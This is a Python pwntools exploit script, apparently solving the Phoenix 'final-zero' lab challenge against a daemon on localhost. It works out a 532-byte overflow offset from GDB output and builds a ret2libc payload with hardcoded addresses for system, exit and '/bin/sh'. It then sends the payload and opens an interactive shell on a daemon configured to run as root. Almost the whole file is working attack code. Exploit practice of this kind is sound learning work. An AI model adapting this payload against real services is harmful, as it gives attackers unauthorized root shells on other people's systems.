#!/usr/bin/python

from pwn import *

p = remote("localhost", 64013)

def main():
	'''
	/etc/systemd/system
	Run daemon as root:
	
	[Service]
	Type=simple
	Restart=always
	#User=phoenix-i386-final-zero
	#User=phoenix-i386-final-zero
	User=root
	User=root
	'''

	# Skips prompt
	p.recvrepeat(0.2)

	# From GDB:
	#
	# Stopped reason: SIGSEGV
	# 0x41507341 in ?? ()
	#
	# gdb-peda$ pattern_offset 0x41507341
	# 1095791425 found at offset: 532

	log.info("Crafting payload")
	buf = "A" * 532
	
	# From GDB:	
	#
	# gdb-peda$ p system
	# $4 = {<text variable, no debug info>} 0xf7fad824 <system>
	#
	# gdb-peda$ p exit
	# $5 = {<text variable, no debug info>} 0xf7f7f543 <exit>
	#
	# gdb-peda$ find "/bin/sh"
	# Found 2 results, display max 2 items:
	# libc.so : 0xf7ff867a ("/bin/sh")
	# --snip--

	system_addr = 0xf7fad824
	bin_sh_addr = 0xf7ff867a
	exit_addr = 0xf7f7f543

	#---------------#
	# 532 A(Junk) 	#
	#---------------#
	# system_addr   #
	#---------------#
	# exit_addr     #
	#---------------#
	# bin_sh_addr   #
	#---------------# 
	
	buf += p32(system_addr)
	buf += p32(exit_addr) # Graceful exit
	buf += p32(bin_sh_addr)

	p.sendline(buf) # Sends payload
	log.warn("Payload sent!")

	p.interactive() # Pass interaction back to user

if __name__ == "__main__":
	main()
